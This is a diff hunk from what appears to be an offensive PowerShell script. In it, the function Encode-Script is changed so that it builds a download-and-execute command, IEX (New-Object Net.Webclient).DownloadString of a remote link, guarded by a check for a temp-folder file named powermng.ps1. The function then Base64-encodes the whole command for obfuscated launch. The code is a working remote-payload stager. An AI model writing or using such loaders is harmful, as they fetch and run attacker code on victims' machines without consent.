@@ -463,9 +463,9 @@ echo "=====The World Wireless~=====" > $env:temp/powermng.dat
 
 function Encode-Script {
 $link = Get-Link 
-$bytes = [Text.Encoding]::Unicode.GetBytes($link)
-$enc = [Convert]::ToBase64String($bytes)
-$enc = "if (-NOT (Test-Path `$env:temp/powermng.ps1)) {IEX (New-Object Net.Webclient).DownloadString('$link') }"
+$encz = "if (-NOT (Test-Path `$env:temp/powermng.ps1)) {IEX (New-Object Net.Webclient).DownloadString('$link') }"
+$bytes = [Text.Encoding]::Unicode.GetBytes($encz)
+$base = [Convert]::ToBase64String($bytes)
 echo $base
 }
 
